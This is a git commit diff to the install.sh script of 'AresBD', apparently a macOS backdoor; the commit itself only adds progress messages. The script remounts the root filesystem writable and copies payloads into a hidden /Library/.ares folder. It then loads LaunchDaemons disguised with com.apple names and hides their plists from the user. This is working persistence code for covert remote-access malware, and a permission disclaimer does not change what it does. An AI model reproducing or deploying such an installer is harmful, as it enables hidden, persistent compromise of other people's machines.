5643ae935cd2fbe15af6a6b13ca3c74fab46aab1
Stsosz <sabergelpreston@icloud.com>
2015-02-19 07:11:18 -0500

    Small upgrades

--- ABDConsole/Ares/Server/install.sh
+++ ABDConsole/Ares/Server/install.sh
@@ -7,30 +7,36 @@
 #  Don't be an asshole. Don't use this without permission. I'm not responsible for
 #  Any stupid stuff you do with AresBD.
 
+echo -e "Running a filesystem check... \c"
 fsck –fy
+echo "Done."
+
+echo -e "Mounting filesystem with read-write access... \c"
 mount –uw /
+echo "Done"
 
+echo -e "Creating directories... \c"
 mkdir -vp /Library/.ares
-
 mkdir -vp /Library/LaunchDaemons
+echo -e "Done."
 
 cp -v /Volumes/Ares/ares-hidden/* /Library/.ares
 
 cp -v /Volumes/Ares/LaunchDaemons/* /Library/LaunchDaemons
 
-echo "Making everything executable..."
+echo -e "Making everything executable... \c"
 chmod +x /Library/.ares/connect.sh
 chmod +x /Library/.ares/update.sh
 echo "Done"
 echo ""
 
-echo "Making sure that the user cannot read plists..."
+echo -e "Making sure that the user cannot read plists... \c"
 chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
 chmod 600 /Library/LaunchDaemons/com.apple.update.plist
 echo "Done."
 echo ""
 
-echo "Loading plists into LaunchCTL"
+echo -e "Loading plists into LaunchCTL \c"
 launchctl load /Library/LaunchDaemons/com.apple.ares.plist
 launchctl load /Library/LaunchDaemons/com.apple.update.plist
 echo "Done."
